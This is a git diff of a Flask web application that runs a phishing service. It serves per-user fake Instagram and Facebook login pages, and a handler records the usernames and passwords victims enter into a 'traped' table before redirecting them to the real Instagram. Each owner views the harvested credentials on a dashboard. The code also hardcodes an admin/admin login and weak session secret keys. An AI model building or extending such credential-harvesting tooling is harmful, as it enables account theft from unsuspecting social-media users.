@@ -1,24 +1,23 @@
-
-from urllib.parse import uses_relative
-from flask import Flask,render_template,request,redirect,url_for,session
+from flask import Flask,render_template,request,redirect,session
 import DBHelper as dbh
 
 app = Flask(__name__)
-app.secret_key="mysecret"
 
-# user of current session
-Suser=None
+app.secret_key="myNameIsHeera"
 
 
 
+#completed
 @app.route("/")
 def home():
-    if 'user' in session and session['user']==Suser:
-        return render_template("home.html",uid=Suser,isLogged=True)
+    if 'user' in session:
+        return render_template("home.html",uid=session['user'],isLogged=True)
     return render_template("home.html")
 
 
-#90% done only problem is POST data is available in current page when refreshing
+
+
+#completed
 @app.route("/register",methods=['POST','GET'])
 def register():
     if request.method=='POST':
@@ -39,50 +38,56 @@ def register():
 
 
 
-#90% done just session needs little modification
+#completed
 @app.route("/login",methods=['POST','GET'])
 def login():
     if request.method=='POST':
         username=request.form.get('username')
         password=request.form.get('password')
-        if dbh.checkUserCredential(username,password):
+        #for ADMIN
+        if username=='admin' and password=='admin':
+            session['admin']="admin"
+            print(username,"logged in admin")
+            return redirect('/admin')
+        elif dbh.checkUserCredential(username,password):
             session['user']=username
-            global Suser
-            Suser=username
             print(username,"logged in")
             return redirect('/')
-        #for ADMIN
-        elif username=='admin' and password=='admin':
-            session['user']="admin"
-            Suser=username
-            print(username,"logged in")
-            return redirect('/admin')
+        
         else:
             return render_template("login.html",wrongDetail=True)
     return render_template("login.html")
 
 
 
+
 #completed
 @app.route('/logout')
 def logout():
-    session.pop('user')
+    if 'user' in session:
+         session.pop('user')
+    if 'admin' in session:
+        session.pop('admin')
     return redirect('/')
+
+
 
 
 #Completed
 @app.route("/apps")
 def apps():
-    if 'user' in session and session['user']==Suser:
-        return render_template("/apps.html",isLogged=True,uid=Suser)
+    if 'user' in session:
+        return render_template("/apps.html",isLogged=True,uid=session['user'])
     return render_template("login.html",isLogged=False)
 
 
-#needs more modification
+
+
+#completed
 @app.route('/dashboard')
 def dashboard():
-    if 'user' in session and session['user']==Suser:
-        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(Suser),isLogged=True,uid=Suser)
+    if 'user' in session :
+        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(session['user']),isLogged=True,uid=session['user'])
     return render_template("login.html",isLogged=False)
 
 
@@ -95,14 +100,19 @@ def page_not_found(error):
 
 
 
+#............INSTAGRAM..........
+
+#for looking demo
+@app.route("/instagram.com")
+def insta():
+    return render_template("/apps/insta.html")
 
 #completed
 @app.route("/<userid>/instagram.com")
-def phishingPage(userid):
+def InstaPhishingPage(userid):
     if dbh.checkIfUserExists(userid):
-        return render_template("instagram/insta.html",uid=userid)
+        return render_template("apps/insta.html",uid=userid)
     return render_template('page_not_found.html')
-
 
 
 #completed
@@ -117,9 +127,9 @@ def loginInsta():
         pas=request.form.get('pas')
         dbh.insertIntoTraped(owner,site,uid,pas)
         print(owner,site,uid,pas)
-        
     return redirect("https://instagram.com")
 
+#..........INSTAGRAM END..........
 
 
 
@@ -127,11 +137,12 @@ def loginInsta():
 
 
 
-#ADMIN PAGE
+
+#........ADMIN PAGE............
 @app.route("/admin")
 def admin():
-     if 'user' in session and session['user']==Suser:
-        return render_template("ADMIN.html",allData=dbh,isLogged=True,uid=Suser)
+     if 'admin' in session:
+        return render_template("ADMIN.html",allData=dbh,uid=session['admin'])
      return render_template("login.html",isLogged=False)
 
 
@@ -139,13 +150,10 @@ def admin():
 
 
 
-#admin not needed now
-@app.route("/instagram.com")
-def insta():
-    return render_template("/instagram/insta.html")
+
 @app.route("/facebook.com")
 def facebook():
-    return render_template("/facebook/facebook.html")
+    return render_template("/apps/facebook.html")
 
 
 
